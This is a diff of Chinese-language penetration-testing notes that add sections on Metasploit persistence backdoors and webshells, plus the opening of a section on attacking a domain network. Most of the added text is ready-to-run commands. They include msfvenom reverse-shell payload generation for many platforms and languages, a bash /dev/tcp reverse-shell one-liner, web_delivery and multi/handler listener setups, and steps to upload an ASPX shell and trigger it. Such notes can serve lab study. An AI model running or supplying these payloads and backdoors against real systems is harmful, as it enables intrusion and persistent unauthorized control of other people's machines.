@@ -3925,15 +3925,13 @@ reload_all
 
 
 
-### 后门
-
-#### 操作系统后门
+### 操作系统后门
 
 后门泛指渗透目标，为了维持我们对目标系统的控制权，我们使用Metasploit提供的Persistence等后渗透攻击模块，通过在目标机上安装自启动、永久服务等方式，来长久地控制目标机！
 
 
 
-##### 1、Cymothoa后门
+#### 1、Cymothoa后门
 
 Cymothoa可以将ShellCode注入现有进程（即插进程）的后门工具。可以把ShellCode伪装成常规程序，并可以与被注入的程序（进程）共存，以避免被管理和维护人员怀疑。另外一项优势：即使目标系统的安全防护工具能够监视可执行程序的完整性，只要它不检测内存，就发现不了（插进程）后门程序的进程。
 
@@ -4015,7 +4013,7 @@ nc -nvv 192.168.163.136 4444
 
 
 
-##### 2、Persistence后门
+#### 2、Persistence后门
 
 Persistence是一款使用安装自启动方式的持久性后门程序，我们可以利用它创建注册和文件。
 
@@ -4030,10 +4028,12 @@ Persistence是一款使用安装自启动方式的持久性后门程序，我们
 - 创建一个持久性的后门
 
   ```
-  run persistence -A -S -U -X -i 5 -p 4321 -r 192.168.16.106
+  run persistence -A -S -U -X -i 60 -p 4233 -r 192.168.16.111
   ```
+  
+  ![image-20210322173734031](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210322173734031.png)
 
-这样电脑在系统登陆，用户登陆，开机，使用中每个5秒都会回连你的机器
+这样下次电脑在系统登陆，用户登陆，开机，使用中每个60秒都会回连你的机器
 
 然后我们使用下面的漏洞利用模块和攻击载荷进行监听
 
@@ -4041,11 +4041,11 @@ Persistence是一款使用安装自启动方式的持久性后门程序，我们
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 
-set LHOST 192.168.16.106	//设置自己的IP和回连的端口
-set LPORT 4321
+set LHOST 192.168.16.111	//设置自己的IP和回连的端口
+set LPORT 4233
 ```
 
-
+相关参数
 
 | 参数 | 作用                  |
 | ---- | --------------------- |
@@ -4059,69 +4059,299 @@ set LPORT 4321
 
 
 
+### Web后门
+
+Web后门泛指Webshell，包括ASP、ASPNET、PHP、JSP代码等。攻击者通过一段设计过的代码，获得服务器端的敏感信息。
+
+常见的Web后门可以提供例如：命令执行、文件泄露、辅助提权、SQL注入、反弹shell等。
+
+常见工具：中国蚁剑、中国菜刀、Weevely(只支持PHP，kali下常用)
+
+
+
+#### 1、Meterpreter后门
+
+在Metasploit中有一个名为PHP Meterpreter的Payload，利用这个模块可创建具有Meterpreter功能的PHP Webshell
+
+**使用步骤如下**
+
+- 使用msfvenom创建个webshell.php
+- 上传webshell.php到目标服务器
+- 运行Metasploit multi-handler开始监听
+- 访问webshell.php页面
+- 获得反弹的Metasploit Shell
+
+简单来说，我们生成一个脚本，再弄到对方机器上去让他执行，我们持续监听就可以拿到shell
+
+
+
+#### 1.1、msfvenom工具使用
+
+我们可利用msfvenom生成木马程序，并在目标机上执行，在本地监听上线
+
+首先我们先通过Metasploit的msfvenom工具制作PHP Meterpreter，我们先看一下参数
+
+| 参数 | 作用                           |
+| ---- | ------------------------------ |
+| -p   | 选择一个载荷，或者说一个模块吧 |
+| -l   | 载荷列表                       |
+| -f   | 生成的文件格式                 |
+| -e   | 编码方式                       |
+| -i   | 编码次数                       |
+| -b   | 在生成的程序中避免出现的值     |
+| -a   | 系统结构，默认x86              |
+| -s   | payload最大大小                |
+
+| 常用命令           | 作用                             |
+| ------------------ | -------------------------------- |
+| `--list payload`   | 列出可以的payload载荷            |
+| `--list formats`   | 列出允许的payload的输出格式      |
+| `--list encoders`  | 列出可使用的编码列表             |
+| `--list encrypt`   | 列出允许使用的Shell code加密列表 |
+| `--list archs`     | 列出可使用的系统架构             |
+| `--list platforms` | 列出可利用的目标系统平台         |
+
+
+
+因为我的目标平台是一个win7 64 位，所以要找一个相应的载荷
+
+筛选一下我们所需要的载荷
+
+```
+msfvenom -l payload | grep windows | grep x64 | grep tcp
+```
+
+生成程序（默认路径是在home下）
+
+```
+msfvenom -a x64 -p windows/x64/meterpreter_reverse_tcp lhost=攻击者IP lport=攻击者端口 -f exe X > flash_win7.exe
+```
+
+
+
+##### 使用MSF生成各种Payload（各种后门）
+
+**Windows:**
+
+```BASH
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=
+攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b 'x00x0axff' -i 3 -f exe -o
+payload.exe
+```
+
+**Linux:**
+
+```BASH
+msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻
+击机IP LPORT=攻击机端口 -f elf -o payload.elf
+```
+
+**MAC OS:**
+
+```BASH
+msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP
+LPORT=攻击机端口 -f macho -o payload.macho
+```
+
+**Android:**
+
+```BASH
+msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=攻
+击机IP LPORT=攻击机端口 -f apk -o payload.apk
+```
+
+**PowerShell:**
+
+```BASH
+msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=
+攻击机IP LPORT=攻击机端口 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1
+```
+
+**PHP:**
+
+```BASH
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=
+<Your Port to Connect On> -f raw > shell.php
+	
+cat shell.php | pbcopy && echo '<?php ' | tr -d '
+' > shell.php && pbpaste >>
+shell.php
+```
+
+**ASP.net:**
+
+```BASH
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=
+攻击机IP LPORT=攻击机端口 -f aspx -o payload.aspx
+```
+
+**JSP:**
+
+```BASH
+msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻
+击机端口 -f raw -o payload.jsp
+```
+
+**War:**
+
+```BASH
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -
+o payload.war
+```
+
+**Node.js:**
+
+```BASH
+msfvenom -p nodejs/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o
+payload.js
+```
+
+**Python:**
+
+```BASH
+msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -
+f raw -o payload.py
+```
+
+**Perl:**
+
+```BASH
+msfvenom -p cmd/unix/reverse_perl LHOST=攻击机IP LPORT=攻击机端口 -f raw -o
+payload.pl
+```
+
+**Ruby:**
+
+```BASH
+msfvenom -p ruby/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o
+payload.rb
+```
+
+**Lua:**
+
+```BASH
+msfvenom -p cmd/unix/reverse_lua LHOST=攻击机IP LPORT=攻击机端口 -f raw -o
+payload.lua
+```
+
+
+
+##### 生成 ShellCode
+
+**Windows ShellCode:**
+
+```BASH
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=
+攻击机IP LPORT=攻击机端口 -f c
+```
+
+**linux shellcode:**
+
+```BASH
+msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻
+击机IP LPORT=攻击机端口 -f c
+```
+
+**mac shellcode:**
+
+```BASH
+msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP
+LPORT=攻击机端口 -f c
+```
+
+**Bash shellcode:**
+
+```BASH
+[root@localhost ~]# msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.30 LPORT=8888 > -f raw > payload.sh
+[root@localhost ~]# exec 5<>/dev/tcp/xx.xx.xx.xx/xx
+[root@localhost ~]# cat <&5 | while read line; do $line 2>&5 >&5; done
+```
+
+**Python shellcode**
+
+```BASH
+msf5 > use exploit/multi/script/web_delivery
+msf5 exploit(multi/script/web_delivery) > set srvhost 192.168.1.30
+srvhost => 192.168.1.30
+msf5 exploit(multi/script/web_delivery) > set lhost 192.168.1.30
+lhost => 192.168.1.30
+msf5 exploit(multi/script/web_delivery) > set uripath lyshark
+uripath => lyshark
+msf5 exploit(multi/script/web_delivery) > exploit -j -z
+```
+
+
+
+##### 设置监听
+
+启动Msfconsole，设置监听模块
+
+```
+use exploit/multi/handler
+set LHOST 攻击机IP
+set LPORT 攻击机端口
+run
+```
+
+最后使用sysinfo和getuid等命令渗透目标主机
+
+
+
+####  2、Aspx Meterpreter后门
+
+这里使用Metasploit下名为**shell_reverse_tcp**的Payload，利用这个模块可以创建各种版本的ShellCode，例如常见的Asp、Aspx、msi、vbs、war等
+
+```
+show payloads
+use windows/shell_reverse_tcp
+info
+set lhost 192.168.31.247
+set lport 4444
+save
+```
+
+接着输入generate -h命令查看帮助命令
+
+```
+generate -h
+```
+
+![image-20210322214510708](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210322214510708.png)
+
+接下来就是**生成各个版本的ShellCode命令**
+
+```
+generate -t asp //生成Asp版的ShellCode
+generate -t aspx //生成Aspx版的 Shell Code
+```
+
+我们把内容保存为aspx.aspx，再上传到目标服务器
+
+接着启动Msfconsole，使用以下命令设置监听
+
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set Lhost 192.168.31.247
+set lport 4444
+run
+```
+
+然后打开`http://192.168.31.250/aspx.aspx`
+
+回到MSF下面，就可以看到服务端已经反弹成功
 
 
 
 
 
+### 内网攻击域渗透测试
 
+环境：假设我们现在已经渗透了一台服务器PAVMSEF21，该服务器内网IP为10.51.0.21。扫描后发现内网网络结构大概如图所示，其中 PAVMSEF21是连接外网和内网的关键节点，内网的其他服务器均不能直接连接
 
+![image-20210322220244488](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210322220244488.png)
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+我们的渗透目标是通过一个普通的Webshell权限一步步地获得域管权限，从而掌控整个内网
 
 
 
